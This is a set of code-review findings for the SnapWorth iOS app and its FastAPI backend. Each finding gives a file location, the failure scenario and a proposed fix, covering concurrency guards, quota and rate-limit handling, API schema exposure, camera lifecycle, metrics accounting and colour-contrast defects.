### `restore()` has no re-entrancy guard, unlike `purchase()`, so overlapping restores drop the spinner mid-flight

`ios/SnapWorth/ViewModels/PaywallViewModel.swift:81`

`purchase()` opens with `guard !isPurchasing, !isRestoring else { return }` (line 55) and the comment at lines 51-54 states the reason explicitly: the View's `.disabled` depends on a render cycle, so it must not be the only thing between a fast double-tap and a duplicate payment call. `restore()` (lines 80-83) sets `isRestoring = true` with no guard of any kind, so the asymmetry is a hole in the same reasoning: `PaywallView.swift:170` disables the button on `vm.isPurchasing || vm.isRestoring`, but that only takes effect after SwiftUI re-renders.

**What happens.** Two taps on "Restore purchase" landing in the same frame both enter `restore()`. Two `AppStore.sync()` calls run concurrently, each capable of raising its own App Store authentication prompt, and the first to finish runs `defer { isRestoring = false }` — clearing the spinner and re-enabling the button while the second sync is still running, so a third tap can start yet another. The `errorMessage` written by whichever finishes last wins, so the user can be shown the outcome of a call they did not make last.

**Fix.** Mirror the purchase guard exactly: add `guard !isRestoring, !isPurchasing else { return }` as the first line of `restore()` (before line 81).

### A 402 never writes the server's verdict into `FreeScanCounter`, so the counter keeps advertising a scan the server will refuse

`ios/SnapWorth/ViewModels/ScanViewModel.swift:144`

The paywall branch (lines 144-149) tracks `freeScanLimitHit`, sets the trigger and presents the paywall, but leaves `FreeScanCounter` untouched — the one place in the flow where the server has just stated authoritatively that the allowance is spent. `freeScansRemaining` (line 40 → `FreeScanCounter.remaining`, line 355-357) therefore still returns the pre-402 figure, so the top bar keeps rendering "1 free scan left today" (ScanView.swift:80) instead of flipping to the "Upgrade to Pro" button (ScanView.swift:67), and the pre-flight gate at line 48 keeps passing. Compare the success path, which does reconcile at line 95, and the token mint, which does the same at AttestationService.swift:260.

**What happens.** Any 402 the pre-flight gate did not predict — the only reason this branch exists. The backend reserves a quota unit before running the scan and releases it only via `refund`/`consume` (backend/quota.py `reserve`/`refund`/`consume`), so a scan whose connection drops after the reserve leaves the server at zero while the client still believes it holds one. The user then loops: tap shutter → full image upload → 402 → paywall → dismiss → top bar still says "1 free scan left today" → tap again. Every iteration re-uploads the photo and re-presents the paywall, and the counter never tells the truth.

**Fix.** Reconcile the quota case only, inside the `isPaywall` branch: `if case .quotaExceeded = appError { FreeScanCounter.serverRemaining = 0 }`. Do not zero it for `.proRequired`, which is a Pro-only endpoint refusal and says nothing about the daily allowance. The same branch in ThriftFlipViewModel.swift:98-102 needs the identical line.

### Snap to Sell and the listing draft expose the estimate while priceCovered is still true

`ios/SnapWorth/Views/ResultView.swift:137`

priceCovered (line 635) gates whyThisPriceCard and addTagCard behind `if !priceCovered` at line 82, with the comment "The ladder would give the covered number away." The same reasoning is not applied to the two other cards that render the number: snapSellCard (line 137) is always in the stack, and generatedListingView prints priceTag("Ask", listing.listingPrice) / priceTag("Floor", listing.negotiationFloor) at lines 1107-1108 — both derived server-side from result.priceRange (ListingService.swift:157-164). listingDraftCard (line 131) is likewise ungated, and its "Copy listing draft" button writes `Asking: \(result.formattedRange)` to the clipboard (ResultViewModel.swift:136).

**What happens.** Fresh scan with Guess First on: the value card reads "$ ? ? ?" and asks the user to guess. A Pro user scrolls down, taps "Generate eBay listing", and the same screen prints "Ask $72 / Floor $48" above the still-covered card — the guess is over before Reveal is tapped. A free user gets the same via "Copy listing draft", which puts "$45-$90" on the clipboard.

**Fix.** Wrap snapSellCard (lines 137-139) and listingDraftCard (lines 131-135) in the existing `if !priceCovered` branch, the way whyThisPriceCard and addTagCard already are, and adjust the conditionCard top padding at line 117 for the new branch.

### Re-listing an item reuses the original listedDate, so its 14-day follow-up is silently dropped

`ios/SnapWorth/Views/ResultView.swift:506`

setStatus's `.listed` case only seeds listedDate when it is nil (line 506) and then schedules the follow-up from that value (lines 507-508). NotificationManager.ledgerFireDate is listedDate + 14 days (NotificationManager.swift:575-581) and add() refuses a past fire date, removing the pending request instead (NotificationManager.swift:454-457). So for any item whose original listedDate is more than 14 days old, moving it back to Listed schedules nothing — and line 197 of NotificationManager still adds it to a bucket keyed to a past day that no notification backs.

**What happens.** Item listed on 20 Aug, marked Sold on 5 Sep, sale falls through, user taps "Listed" again on 12 Sep. listedDate is still 20 Aug, the computed fire date is 3 Sep, so the "Did X sell?" nudge — the entire point of the Listed status — never arrives, with no indication to the user.

**Fix.** Reset the clock when the item re-enters `.listed` from a non-listed status: in the `.listed` case, `if previous != .listed || result.listedDate == nil { result.listedDate = Date() }`, then schedule from that date.

### `onAppear` starts the capture session unconditionally, re-opening the I-14 battery leak whenever the view re-appears with a sheet over it

`ios/SnapWorth/Views/ScanView.swift:247`

`onAppear` calls `cameraManager.requestPermissionAndSetup()` (line 247), which for an already-configured session falls through to `startSession()` (CameraManager.swift:42) with no check on `isCameraObscured`. The `onChange(of: isCameraObscured)` at lines 264-270 — added to stop the pipeline behind presentations, per the comment at 259-263 and I-14 in docs/AUDIT-2026-09-07.md:120 — is bypassed, because `onAppear` is a second, unconditional start path.

**What happens.** Start a scan and switch to the My Finds tab while it runs (the scan continues: `triggerScan` runs in an unstructured `Task` at line 244, which view disappearance does not cancel). The scan completes and sets `showResult = true` (line 397) while ScanView is off-screen, so the `isCameraObscured` onChange has already stopped the session. Return to the Scan tab: `onAppear` starts the full photo-preset pipeline (sensor, ISP, 30fps preview) behind the result sheet, and nothing stops it until the sheet is dismissed. If the user then opens the tag camera from that sheet (ResultView.swift:1386-1390), a second `AVCaptureSession` starts on the same device while this one is running, and with no interruption handling one of the two previews goes black.

**Fix.** Route every start through one state-reconciling helper instead of two paths: in `onAppear`, request permission but only start when `!isCameraObscured` (e.g. `if !isCameraObscured { cameraManager.requestPermissionAndSetup() } else { /* permission only */ }`), or split `requestPermissionAndSetup()` into permission handling plus an explicit `syncSessionState(obscured:)` that both `onAppear` and the onChange call.

### `.notDetermined` and `.restricted` both render the "access denied / Open Settings" placeholder

`ios/SnapWorth/Views/ScanView.swift:37`

Line 37 branches only on `authStatus == .authorized`; the `else` at lines 40-42 shows `permissionPlaceholder` — "Camera access needed to scan items" plus an "Open Settings" button (lines 366-378) — for every other status, `.notDetermined` included. `CameraManager.init` sets `.notDetermined` at line 19, so on first launch that copy is what renders under the system permission dialog before the user has refused anything. Separately, `requestPermissionAndSetup` rewrites `.restricted` to `.denied` (CameraManager.swift:33-34), so a camera blocked by Screen Time or an MDM profile is indistinguishable from a user refusal.

**What happens.** First launch: "Camera access needed to scan items" + "Open Settings" is visible behind the OS prompt, before any decision has been made — the app accuses the user of a refusal they have not made. On a Screen Time- or MDM-restricted device the same screen is permanent, and its only affordance opens a Settings page that has no camera switch to flip, so the user cannot act on it.

**Fix.** Switch on the status instead of falling through: `.notDetermined` → a neutral "Starting camera…" / priming state with no Settings button, `.denied` → the current placeholder, `.restricted` → copy that names the restriction ("Camera access is restricted on this device") without a Settings button. Keep `.restricted` in `authStatus` rather than collapsing it to `.denied` at CameraManager.swift:34.

### A second shutter tap spawns an overlapping triggerScan task that clears the freeze-frame under the analysing overlay

`ios/SnapWorth/Views/ScanView.swift:244`

`onChange(of: cameraManager.capturedImage)` spawns an unstructured `Task { await triggerScan(image: image) }` per captured photo (:244). The shutter's `.disabled(vm.isAnalyzing)` (:189) only takes effect once `startScan` has set `isAnalyzing = true` (ScanViewModel.swift:56), which cannot happen until the capture pipeline has delivered a photo and the delegate has hopped back to the MainActor (CameraManager.swift:148) — several hundred milliseconds of photo processing during which the button is still live. Two taps therefore produce two `capturePhoto()` calls, two delegate callbacks, two `capturedImage` assignments and two overlapping `triggerScan` tasks. The second one's `await vm.startScan(...)` returns immediately on the `guard !isAnalyzing` at ScanViewModel.swift:47, and then unconditionally runs the teardown at ScanView.swift:394-395 — `vm.capturedImage = nil` and `cameraManager.capturedImage = nil` — even though the first scan is still in flight and still needs that image.

**What happens.** Double-tap the shutter. `vm.capturedImage` is niled while `vm.isAnalyzing` is still true, so the `if let shot = vm.capturedImage` freeze-frame behind `AnalyzingOverlay` (ScanView.swift:229-235) disappears and the live camera preview shows through underneath the spinner — directly contradicting the overlay's own "Photo captured — you can lower your phone" line (DesignSystem.swift:605). The scan itself still completes and the sheet still presents, so the damage is confined to the overlay, but it is the one screen the app is judged on.

**Fix.** Make the teardown conditional on this task still owning the scan, or gate the second task out entirely. Cheapest: in `triggerScan` (ScanView.swift:384-399), capture whether `startScan` actually ran — have `ScanViewModel.startScan` return a `Bool` (false on the `guard !isAnalyzing` early return) and skip the `vm.capturedImage = nil` / `cameraManager.capturedImage = nil` / `showResult` block when it is false. Alternatively add an `isCapturing` flag set synchronously in `CameraManager.capturePhoto()` and cleared in the delegate, and disable the shutter on that instead of on `vm.isAnalyzing`.

### **[FIXED]** /auth/entitlement is the one authenticated route with no rate limit, and each call runs a full Apple JWS verification

`backend/auth.py:421`

`record_entitlement` (auth.py:421-425) depends on `require_auth` but never calls `_enforce_limits`, unlike every other authenticated route (`/scan` main.py:1330, `/trends` main.py:1917, `/listing` main.py:1959). `require_auth` itself contains no limiter. Each call therefore runs `EntitlementService.record` → `verify_signed_transaction` → `verify_apple_jws`: an x.509 chain decode, validity and CA-constraint checks, and two to three ECDSA P-256 verifications, followed by the entitlement cache write, the proof write and the device-binding read/write (entitlements.py:457-487). Unlike the /auth/challenge-attest-refresh trio, it is not covered by `_limit_unauthenticated` either, so a single attested device can drive that work and those Redis writes at line rate against a single uvicorn worker.

**What happens.** 120 consecutive `POST /auth/entitlement` with one valid bearer token all return 400 (bad transaction) with zero 429s, each having attempted a full JWS verification; 120 `GET /trends` with the same token return 100x 429. Verified against a TestClient with a minted token.

**Fix.** Add `request: Request` to the signature and `await _enforce_limits(principal.subject, _client_ip(request))` before the `deps.entitlements.record` call — matching `/trends`. As with the finding above, `_enforce_limits` and `_client_ip` live in `main`, so either inject them onto `AuthDeps` alongside `ip_limiter` or move both into `ratelimit.py`. The legitimate client calls this at cold launch, purchase, restore and `Transaction.updates`, so the existing `RATE_MAX_REQUESTS` bucket is far above real usage.

### **[FIXED]** MAX_DEVICES_PER_SUBSCRIPTION=0 makes every purchase 500 on an empty binding record

`backend/entitlements.py:590`

`min(bindings, key=...)` at line 590 is reached whenever `identity not in bindings and len(bindings) >= self._max_devices`. With `self._max_devices <= 0` and no bindings yet, `0 >= 0` is true and `min()` is called on an empty dict, raising `ValueError: min() arg is an empty sequence`. The surrounding `try/except` blocks cover only the cache read (line 577) and the cache write (line 620), so the ValueError propagates out of `_bind_device` → `record()` → `auth.record_entitlement`, where only `EntitlementError` is handled (auth.py:439) — so it surfaces as a 500, not a 400.

The trigger is a plausible operator action rather than a typo: `.env.example:157-166` describes the value as "a *detection* threshold, not an authorisation boundary — nothing is refused when it is crossed," which reads as though 0 would simply disable the detection. It disables the endpoint instead.

**What happens.** An operator sets `MAX_DEVICES_PER_SUBSCRIPTION=0` to turn off the sharing detection. The next real purchase POSTs to `/auth/entitlement`: `verify_signed_transaction` succeeds, `_bind_device` is entered with an empty `txn:{otid}` record, `min({})` raises, and the paying customer gets a 500 with no entitlement recorded and no proof stored — on every retry, for every subscriber, until the variable is changed back.

**Fix.** Guard the constant at line 113: `max(1, int(os.environ.get("MAX_DEVICES_PER_SUBSCRIPTION", "6")))`, and treat `<= 0` as "cap disabled" by skipping the eviction branch entirely rather than falling into it. Belt and braces: change the condition at line 589 to `and bindings and len(bindings) >= self._max_devices` so an empty record can never reach `min()`.

### **[FIXED]** The eviction log reports the cap as the device count, so the sharing signal is unreadable

`backend/entitlements.py:597`

`extra={"devices": self._max_devices, "max": self._max_devices, ...}` (line 597) logs the configured cap twice under two names. `devices` is meant to be the number of bindings actually held — `len(bindings)`, which at that point is the pruned set of other concurrently-bound identities, before `identity` is added at line 613. As written, `devices == max` by construction in every line ever emitted, so the field carries no information, and it is actively wrong whenever the record is over the cap: after the operator lowers MAX_DEVICES_PER_SUBSCRIPTION from 6 to 3, a record holding 6 live bindings logs `devices: 3`.

This is the log an operator reads when the `subscription_over_cap` alert fires (lines 607-609) and they want to know how bad the sharing is. It answers with the config value they already know.

**What happens.** A subscription accumulates 9 live bindings after the cap is lowered from 6 to 3. Each `/auth/entitlement` POST evicts one and logs `device binding evicted to make room devices=3 max=3 idle_seconds=12`. The operator investigating the Telegram alert concludes three devices are contending for three slots, when nine are contending and the record will take six more records to converge.

**Fix.** Log the real count: `"devices": len(bindings)` (or `len(bindings) + 1` if the intent is "including the one being bound" — say which in the key name). Take the value before `bindings.pop(evicted)` at line 591 if you want the pre-eviction figure.

### no_price metric hardcodes operation="scan", so an operator bot test photo is filed as a user scan failure

`backend/main.py:1481`

`metrics.model_calls.inc(operation="scan", outcome="no_price")` at 1481 is the only counter in `_analyse` that ignores the `count`/label distinction. Every sibling is gated -- `_note_safety_block` at 1433, `count_scan_failure` at 1441, 1458 and 1482 -- and `label` is already computed at 1421-1424 precisely to separate `bot_scan` from `scan` (the T-3 fix in AUDIT-2026-09-07:169-170, whose whole rationale at main.py:352-357 is that one operator test photo is a 25-100% distortion of a day with 1-4 real scans). `label` is in scope at 1481, so this line was simply left behind by that fix. Secondary: the same provider call was already counted at `outcome="success"` by `_generate_with_retry` (main.py:1794), so this is a second increment on the same call and `sum(snapworth_model_calls_total{operation="scan"})` exceeds the real number of calls.

**What happens.** The operator sends a test photo to the Telegram bot; `_bot_scan` runs `_analyse(..., count=False)` (main.py:360-362); the model returns JSON with no usable price, so 1477 fires. `snapworth_model_calls_total{operation="scan",outcome="no_price"}` increments with no user scan behind it -- the exact metric the operator reads to decide whether /scan is broken.

**Fix.** `metrics.model_calls.inc(operation=label, outcome="no_price")` -- `label` is already bound at 1421-1424 and yields `bot_scan`/`bot_scan_with_tag` for the bot path.

### A scan abandoned by the client is billed but counted in no column, inflating $/scan

`backend/main.py:1354`

The disconnect branch at 1354-1358 refunds the allowance (correct -- this is the AUDIT-2026-09-07:147 fix) and returns immediately, jumping over `notify.scan_completed` at 1366-1370. That call is the only thing that increments `scans_free`/`scans_pro` (notify.py:2032). The model tokens, however, were already recorded by `notify.model_usage` inside `_generate_with_retry` (main.py:1796) under the non-operator label `scan`, so they land in `spend`. notify.py:2442-2452 computes `$/scan` as `(spend - operator spend) / (scans_free + scans_pro)` and notify.py:2458-2459 computes the free-tier give-away the same way. `notify.count_scan_failure` is not called on this path either, so the scan appears in neither the success nor the `scans_failed` column -- it is spend with no denominator.

**What happens.** Any /scan whose `_analyse` outlasts the client's 35s resource timeout. With `_RETRY_ATTEMPTS=2` (main.py:1644) and `GEMINI_TIMEOUT_MS=25000` (aiconfig.py:191) a single retried call already reaches ~50s, and a `_retry_as_json` reformat (main.py:1455) can add up to another ~50s. Those are the most expensive scans the service makes, and they are removed from the denominator of the two cost figures the operator uses to decide whether the free tier is viable -- so $/scan reads high by exactly the wrong calls.

**Fix.** Before returning at 1358, keep the scan in the accounting even though the allowance is handed back: either call `notify.scan_completed(...)` as the normal path does, or add an `"abandoned"` entry to `notify.SCAN_FAILURE_LABELS` and call `notify.count_scan_failure("abandoned")`, so every billed model call has a scan behind it in the digest.

### **[FIXED]** /openapi.json, /docs and /redoc are public and publish the full route inventory plus every handler docstring

`backend/main.py:415`

`app = FastAPI(title="SnapWorth API", version=API_VERSION, lifespan=_lifespan)` (main.py:415) leaves FastAPI's defaults `openapi_url="/openapi.json"`, `docs_url="/docs"` and `redoc_url="/redoc"` in place, and no dependency or middleware guards them. This directly defeats a control the code deliberately designed: `/metrics` answers 404 rather than 401 specifically so "an unconfigured or unauthorised caller cannot tell the endpoint exists at all" (main.py:1002-1004) — but `/openapi.json` lists `/metrics` along with its `authorization` header parameter and its entire docstring, including the sentence explaining that it fails closed when `METRICS_TOKEN` is unset. The schema also publishes the design reasoning of the unauthenticated `/apple/notifications` trust model, the `x-device-id` header name, and the exact field constraints of `AttestRequest`, `AssertRequest`, `EntitlementRequest` and `ListingRequest`.

**What happens.** `GET /openapi.json` on the production host returns 200 with `paths` = ['/apple/notifications', '/auth/attest', '/auth/challenge', '/auth/entitlement', '/auth/refresh', '/health', '/health/live', '/health/ready', '/listing', '/metrics', '/privacy', '/scan', '/social/tiktok/callback', '/terms', '/trends'] and each handler's full docstring as its `description`. `/docs` and `/redoc` also return 200. Verified against a TestClient.

**Fix.** Disable the schema in production: `app = FastAPI(title="SnapWorth API", version=API_VERSION, lifespan=_lifespan, openapi_url=None if os.environ.get("ENVIRONMENT", "").lower() in {"production", "prod"} else "/openapi.json")` — setting `openapi_url=None` also disables `/docs` and `/redoc`. If the schema is wanted in production, gate it behind the same `METRICS_TOKEN` check `prometheus_metrics` uses rather than leaving it anonymous.

### **[FIXED]** Sorted-set member is not unique across replicas — os.getpid() is always 1 in the container — so same-millisecond requests to one key collapse and go uncounted

`backend/ratelimit.py:138`

`member = f"{now_ms}-{os.getpid()}-{self._counter}"`. The comment at lines 135-137 says the counter disambiguates same-millisecond calls "within a process", leaving `os.getpid()` to disambiguate processes. It cannot: Dockerfile:57 runs `sh -c "exec uvicorn ... --workers 1"`, so uvicorn is PID 1 in every replica and `os.getpid()` returns 1 everywhere. `self._counter` also starts at 0 in each replica (line 131), so two replicas advance through the same member strings. When two replicas ZADD the same member to the same key, Redis updates the existing member's score rather than adding a second one, `ZCARD` (Lua line 109) stays flat, and one request is never counted against the limit. The module docstring (lines 9-11) names surviving horizontal scale as one of its two reasons to exist, and this is the one shared-state detail that does not. Impact is bounded — an undercount of roughly the number of colliding requests — and today the audits record a single replica, so it is latent rather than live. The most exposed key is `rl:ip:<addr>`: `_client_ip` returns the rightmost X-Forwarded-For hop (main.py:532-534), which behind Railway's edge is the proxy's own address, so every request from every user shares one hot key at the 60/h cap and collisions there are the most likely.

**What happens.** Scale to two replicas. Both are PID 1; both have their own `RedisRateLimiter` with `_counter` starting at 0. Requests 1..N arriving round-robin at the two replicas within the same millisecond produce identical members `"<ms>-1-<n>"`, so each colliding pair registers as one entry in `rl:ip:<proxy>` and the effective IP backstop rises above `IP_RATE_MAX_REQUESTS`. The same applies to `rl:dev:<subject>` when one subject's concurrent scans land on different replicas in the same millisecond.

**Fix.** Make the member globally unique instead of relying on the pid: use `secrets.token_hex(8)` (or `uuid.uuid4().hex`) for the member, or seed a per-instance random prefix once in `__init__` and keep the counter for ordering — e.g. `self._nonce = secrets.token_hex(4)` and `member = f"{now_ms}-{self._nonce}-{self._counter}"`. The member's only requirement is uniqueness; nothing reads it back.

### **[FIXED]** Shimmer is hardcoded Color.white: invisible on light skeletons (1.09:1 peak) and a cold pure-white flare on the warm dark card (7.2:1)

`ios/SnapWorth/DesignSystem/DesignSystem.swift:487`

Lines 487-489 build the travelling gradient from `Color.white` at 0.45/0.65/0.45 and line 481 uses `Color.white.opacity(0.18)` for the Reduce Motion static wash. The surface it is applied to is `Color.snapBorder.opacity(0.6)` (lines 732-736). In light mode that base composites to ≈#F7F3EE over the white card, and the shimmer peak at 0.65 reaches #FCFAF8 — a contrast delta of 1.088:1 against the base, and the Reduce Motion wash is 1.026:1. Both are below the threshold of visible difference, so the light-mode skeleton is a static block. The comment on line 478-479 claims "The surface still reads as 'pending' without the movement" — at 1.026:1 it does not. In dark mode the same white gives a 7.2:1 delta against the dark card: a pure-white streak on an espresso surface, contradicting the file's own stated principle (lines 11-13) that the warm identity is preserved by re-grounding rather than by introducing neutral whites.

**What happens.** Light mode (the default), open History while thumbnails decode (ScanHistoryCard's `.task` at line 741): the placeholder shows no motion, so a slow decode is indistinguishable from a scan whose `imageData` is nil — which renders the identical `snapBorder.opacity(0.6)` rectangle at line 732 with no shimmer. With Reduce Motion on, the 0.18 white wash is a 1.026:1 change and conveys nothing.

**Fix.** Route the shimmer through the palette: `static let snapShimmer = snapAdaptive(light: Color(hex: "2B211C"), dark: Color(hex: "FBF7F2"))` and use it at lines 481 and 487-489 — a darkening sweep on light surfaces, a warm cream sweep on dark ones. Keep the alpha ramp as is; the polarity is what is wrong, not the opacities.

### **[FIXED]** Disabled PrimaryButton dims only the fill, not the cream label — 1.55:1 in light mode, so the label disappears rather than reading as disabled

`ios/SnapWorth/DesignSystem/DesignSystem.swift:332`

Line 332 applies `.opacity(isEnabled ? 1 : 0.4)` to the background only; the label on line 327 stays at full `snapOnAccent` cream. In light mode the 40% terracotta composites over #FBF7F2 to #EDBFAE, and cream on that measures 1.55:1 — the text vanishes into the capsule, leaving a blank pale-peach pill. Dark mode is unaffected (the fill composites down to #6B402F, cream = 8.20:1), so this is a light-mode-only artefact of dimming a fill toward a light ground while the ink stays light. The comment on lines 312-315 names the exact scenario this was added for — "on the paywall that meant a CTA that looked buyable and did nothing when StoreKit failed to return products" — and the fix overshot from "looks active" to "has no label".

**What happens.** Light mode, open the paywall when StoreKit returns no products so `isPurchasable == false` disables the button (PaywallView.swift:112,156). The CTA becomes an empty peach capsule with no readable text — the user cannot tell what the button would have done, only that something is missing.

**Fix.** Dim the whole button so the label tracks the fill: drop the `.opacity` from line 332 and apply `.opacity(isEnabled ? 1 : 0.5)` to the outer `ZStack` (after line 333), which keeps the cream-on-terracotta relationship intact at any dim level.

### **[FIXED]** AnalyzingOverlay's reassurance caption is cream at 70% over a 72% scrim, dropping to ~4.2:1 when the captured photo behind it is bright

`ios/SnapWorth/DesignSystem/DesignSystem.swift:607`

Line 585 lays `Color.snapCharcoal.opacity(0.72)` over whatever is behind, and line 607 draws the caption in `Color.snapOnCharcoal.opacity(0.7)` at dmSans 13pt medium. The thing behind is the frozen captured frame (ScanView.swift:217-223) — an arbitrary photograph. Over a bright frame the scrim composites to ≈#5C5856, and cream at 70% over that measures 4.19:1 (4.32:1 over the cream app background), below the 4.5:1 AA minimum for 13pt. Over a dark frame it is 8.62:1. The primary rotating message on line 601 is full-opacity cream and passes at 6.6:1 in the worst case, so only the secondary line is affected. Note `SnapWorthTests.swift:1680-1682` tests cream-over-charcoal composites for exactly this class of failure but assumes an opaque charcoal ground, which line 585 is not.

**What happens.** Photograph a bright item — a white shirt on a rail, a well-lit shelf — and the "Photo captured — you can lower your phone" caption renders at ≈4.2:1 for the 3-6s analysis, against text that is 13pt. The contrast is photo-dependent, so it is unreproducible from a fixed-asset screenshot test.

**Fix.** Either drop the `.opacity(0.7)` on line 607 (full cream over the brightest possible scrim is 6.60:1, clearing AA) or raise the scrim on line 585 to `.opacity(0.85)`, which holds the caption above 4.5:1 for any frame behind it.

### The 502 .serverUnavailable branch is unreachable — every 502 becomes .aiFailed

`ios/SnapWorth/Models/AppError.swift:132`

Line 132 reads `case 502: return detail.isEmpty ? .serverUnavailable : .aiFailed(detail)`, and the comment at lines 130-131 states "Empty detail keeps the fixed string". But `detail` can only ever come from `APIErrorDetail.parse`, which is the sole constructor of `ScanAPIError.serverError` anywhere in the app (`ScanAPIClient.swift:411`, `ListingService.swift:195`, `ListingService.swift:365`), and `parse` never returns an empty string: the string path is guarded by `!text.isEmpty` (`ScanAPIClient.swift:572`), the 422-array path by `!messages.isEmpty` (`:577`), and every other path returns the non-empty `fallback` "Something went wrong. Please try again." (`:582`). So `detail.isEmpty` is always false and `.serverUnavailable` is never produced from a 502.

**What happens.** The reverse proxy in front of api.snapworth.eu returns a 502 with an HTML body while the app server is down or restarting — the genuine-outage case this branch exists for. `APIErrorDetail.parse` cannot find a JSON `detail`, returns the fallback, and `AppError.from` yields `.aiFailed("Something went wrong. Please try again.")`. During a real outage the user gets the app's most generic message instead of "Our AI is temporarily unavailable. Please try again in a moment." (line 55) — the exact inversion of what lines 123-131 set out to do. (Analytics are unaffected: `ScanFailureReason` maps both to `no_result` — `Analytics.swift:220-229`.)

**Fix.** Make the sentinel detectable. Either have `APIErrorDetail.parse` return `""` when it has nothing and move the user-facing fallback copy into `AppError` (where `.serverUnavailable` and `.unknown` already own it), or make `APIErrorDetail.fallback` internal rather than private (`ScanAPIClient.swift:582`) and change line 132 to `detail.isEmpty || detail == APIErrorDetail.fallback ? .serverUnavailable : .aiFailed(detail)`.

### **[FIXED]** 429 hardcodes "Try again in an hour" and discards the server's Retry-After

`ios/SnapWorth/Models/AppError.swift:106`

`case 429: return .rateLimit` (line 106) throws away both the server `detail` and the response headers, and `.rateLimit`'s copy at line 51 is the fixed "You've hit the scan limit. Try again in an hour." The backend computes the actual remaining wait on its 3600 s sliding window and sends it: `retry_after=max(1, int(window - (now - oldest)))` in the in-memory limiter (`backend/ratelimit.py:87-90`) and `retry_after=abs(int(result))` from the Redis script (`backend/ratelimit.py:143-147`), attached as a `Retry-After` header on every 429 (`backend/main.py:552-553`, `:566-567`, `:581-582`). The value is available to the client — `sendRetryingAuth` returns the `HTTPURLResponse` to all three call sites (`ScanAPIClient.swift:408`, `ListingService.swift:193`, `ListingService.swift:363`) — and is simply never read, because `ScanAPIError.serverError(Int, String)` (`ScanAPIClient.swift:586`) has nowhere to carry it.

**What happens.** A user spends the 20-request-per-hour device budget in the first five minutes of the window — /trends shares the same limiter with no Pro exemption (`backend/main.py:1917`), so tab switching contributes. Fifty-five minutes later they scan: the server answers 429 with `Retry-After: 300`, and the app tells them to wait an hour. They stop using the app for 55 minutes they did not need to wait. The error is unbounded in both directions on a sliding window: the true wait can be anywhere from 1 s to 3600 s while the copy always claims an hour.

**Fix.** Carry the wait through the error. Change the case to `case rateLimit(retryAfter: TimeInterval?)`, add a headers/retry-after parameter to `ScanAPIError.serverError` populated from `http.value(forHTTPHeaderField: "Retry-After")` at the three call sites, and render it in `errorDescription` ("You've hit the scan limit. Try again in about 5 minutes."), keeping the current sentence as the `nil` fallback. Update the `==` arm at line 171 for the new payload.

### Trimming value history from the front silently changes what "change since added" is measured from

`ios/SnapWorth/Models/ScanResult.swift:258`

`refreshPortfolioValue` caps the series by dropping the oldest points: `if history.count > limit { history.removeFirst(history.count - limit) }` (line 258, `limit` defaults to 60). `valueChangeSinceAdded` (lines 275-279) then computes `portfolioValue - Decimal(first.value)` using `history.first` as the item's entry value, and HistoryViewModel.changeLabel (HistoryViewModel.swift:179-184) renders that as the item's signed change. Once the cap has trimmed, `first` is no longer the entry point — it is whatever the 60th-from-last re-price happened to be — and the figure keeps its old label.

**What happens.** An item whose value is recorded as moving more than 60 times (each condition-chip tap that changes the number appends a point, and the dedupe at line 255 only compares against the last point, so cycling new→used→new→used appends every time; tag re-reads append too). On the 61st move the original $45 entry point is dropped, and the "+$12" shown next to the item in History is now measured from a later, arbitrary baseline rather than from what it was worth when added.

**Fix.** Preserve the anchor when trimming — keep `history.first` and drop from the middle, e.g. `if history.count > limit { history = [history[0]] + history.suffix(limit - 1) }` at ScanResult.swift:258 — or store the entry value in its own property and have `valueChangeSinceAdded` read that instead of `history.first`.

### applySharpened keeps the previous read's condition grade when the new response carries no detail, mispricing a user-corrected item

`ios/SnapWorth/Models/ScanResult.swift:92`

`applySharpened` replaces `valueLow`/`valueHigh` unconditionally (lines 87-88) but only replaces `valuationDetailData` inside `if let detail = ValuationDetail(response: response)` (lines 92-94). `ValuationDetail(response:)` is failable and returns nil when every detail field is absent (Services/ScanAPIClient.swift:200-221, `guard !isEmpty`). When it returns nil the old blob survives, so `baselineCondition` (lines 175-181) reads the *previous* read's `conditionGrade` while the prices come from the new one, and `priceRange` (line 198) divides by that stale multiplier. The ordering comment at lines 101-105 assumes the blob was refreshed; when the init fails, it was not.

**What happens.** Requires an item whose condition the user has corrected by hand (`conditionRaw` non-nil — with it nil, `condition == baselineCondition` and the factor is 1, so nothing shows). First scan graded `used` with a full detail blob; the user taps the "New" chip, so the estimate is scaled by 1.35/0.78 = 1.73. A later tag re-read returns a response with none of the ~18 detail fields populated (older server, or a response whose optional detail fields all parsed as absent): the stale blob keeps grade `used`, and the re-read's fresh prices are inflated by the same 1.73 instead of being scaled against the grade the re-read actually reported.

**Fix.** Make the update total: assign `valuationDetailData = ValuationDetail(response: response)?.encoded()` at ScanResult.swift:92-94 so a detail-free response clears the blob and `baselineCondition` falls back to inferring from the new `conditionNotes` (line 180), rather than keeping a grade that describes prices the item no longer has.

### **[FIXED]** Space-grouped thousands are split into two candidates and the larger group is returned as the price

`ios/SnapWorth/Services/PriceTagOCR.swift:94`

Group 2 of the pattern at line 94 admits only `.` and `,` between digit groups, and the `\s?` sits *outside* group 2 (between the currency symbol and the number). So a space-grouped amount is never one token; worse, the `\s?` lets the scanner restart cleanly on the second group. Line 116's `replacingOccurrences(of: " ", with: "")` was written for exactly this input but can never fire from the OCR path, because the regex cannot produce a group-2 token containing a space.

**What happens.** "1 299 €" (French/Nordic/Polish tag printing of 1299, usually U+00A0 or U+202F) yields two matches, tokens "1" and "299" (verified against the pattern), both weak, so `best` returns 299 — a €1299 item read as €299. The currency symbol is also never attached, since it trails the number rather than leading it, so nothing in the result is `strong` and any other integer on the tag can outrank it.

**Fix.** Allow space-class separators in the grouping alternative only, keeping the exact-three-digit requirement: `\d{1,3}(?:[.,\u{00A0}\u{202F} ]\d{3})+(?:[.,]\d{1,2})?`, so "1 299" becomes one token and line 116's strip finally does its job. Keep the 3-digit constraint so "SKU 004821 12.99" is not fused. Also accept a trailing currency symbol (`(?:\s?[$€£])?` after group 2) and OR it into `hasSymbol` at line 101, so trailing-symbol locales get the strong classification the docstring at line 73 already claims ("Sale 12,99 €").

### scheduleWidgetSync is a fixed delay, not a debounce — N mutations spawn N full-history fetches and N widget reloads

`ios/SnapWorth/Services/ScanRepository.swift:122`

`scheduleWidgetSync` spawns a fresh unstructured `Task` per call (line 124) that sleeps 600 ms and then does a full `FetchDescriptor<ScanResult>` on the main actor, `WidgetDataStore.writeHaul` (which ends in `WidgetCenter.shared.reloadAllTimelines()`, Services/WidgetDataStore.swift:683) and `ThriftRunController.update` (an `activity.update()`, Services/ThriftRunController.swift:124). Nothing holds or cancels the previous task, so the calls coalesce only by accident. The commit that added the Live Activity describes this as "the one debounced hook"; it debounces nothing.

